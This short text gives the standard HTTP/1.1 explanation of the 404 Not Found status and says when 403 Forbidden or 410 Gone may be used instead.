The server has not found anything matching the Request-URI. No
indication is given of whether the condition is temporary or
permanent.

If the server does not wish to make this information available to the
client, the status code 403 (Forbidden) can be used instead. The 410
(Gone) status code SHOULD be used if the server knows, through some
internally configurable mechanism, that an old resource is permanently
unavailable and has no forwarding address.
